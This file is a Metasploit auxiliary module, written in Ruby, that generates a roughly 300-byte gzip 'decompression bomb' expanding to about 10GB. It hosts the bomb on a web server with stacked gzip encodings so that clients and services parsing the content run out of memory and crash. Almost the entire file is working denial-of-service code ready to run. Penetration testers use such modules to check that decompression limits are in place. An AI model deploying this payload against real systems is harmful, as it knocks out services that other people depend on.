##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'zlib'
require 'stringio'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Gzip Memory Bomb DOS',
      'Description'    => %q{
        This module generates and hosts a small (~300byte) gzip file that decompresses to 10GB.
        Many applications will not implement a length limit check and will eat up all memory and
        eventually die. This can also be used to kill systems that download/parse content from
        a user-provided URL (image-processing servers, AV, websites that accept zipped POST data, etc).

        A FILEPATH datastore option can also be provided to save the .gz bomb locally.
      },
      'Author'         =>
        [
          'info[at]aerasec.de', # 2004 gzip bomb advisory
          'joev'                # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.aerasec.de/security/advisories/decompression-bomb-vulnerability.html' ]
        ],
      'DisclosureDate' => 'Jan 1 2004',
      'Actions'     =>
        [
          [ 'WebServer' ]
        ],
      'PassiveActions' =>
        [
          'WebServer'
        ],
      'DefaultAction'  => 'WebServer'))

    register_options(
      [
        OptString.new('FILEPATH', [false, 'Local path to (optionally) save the generated gzip']),
        OptInt.new('SIZE', [true, 'Size of uncompressed data in megabytes (10GB default).', 10240]),
        OptInt.new('ROUNDS', [true, 'Rounds of gzip compression.', 3]),
        OptString.new('URIPATH', [false, 'Path of URI on server to the gzip bomb (default is random)'])
      ],
    self.class)
  end

  def run
    datastore['HTTP::compression'] = false # not a good idea
    @gzip = generate_gzip
    print_status "Gzip generated. Uncompressed=#{default_size}bytes. Compressed=#{@gzip.length}bytes."

    path = datastore['FILEPATH']
    File.write(path, @gzip) if path.present?
    exploit # start http server
  end

  def on_request_uri(cli, request)
    print_status "Sending gzipped payload to client #{cli.peerhost}"
    rounds = (['gzip']*datastore['ROUNDS']).join(', ')
    send_response(cli, @gzip, { 'Content-Encoding' => rounds, 'Content-Type' => 'text/html' })
  end

  # zlib ftw
  def generate_gzip(size=default_size, blocks=nil, reps=nil)
    reps ||= datastore['ROUNDS']
    return blocks if reps < 1

    print_status "Generating gzip bomb..."
    StringIO.open do |io|
      stream = Zlib::GzipWriter.new(io, Zlib::BEST_COMPRESSION, Zlib::DEFAULT_STRATEGY)
      buf = nil
      begin
        # add MB of data to the stream. this takes a little while, but doesn't kill memory.
        if blocks.nil?
          chunklen = 1024*1024*8 # 8mb per chunk
          a = "A"*chunklen
          n = size / chunklen

          n.times do |i|
            stream << a
            if i % 100 == 0
              print_status "#{i.to_s.rjust(Math.log(n,10).ceil)}/#{n} chunks added (#{'%.1f' % (i.to_f/n.to_f*100)}%)"
            end
          end
        else
          stream << blocks
        end

        a = nil # gc a
        buf = generate_gzip(size, io.string, reps-1)
      ensure
        stream.flush
        stream.close
      end
      buf
    end
  end

  def default_size
    datastore['SIZE']*1024*1024 # mb -> bytes
  end
end
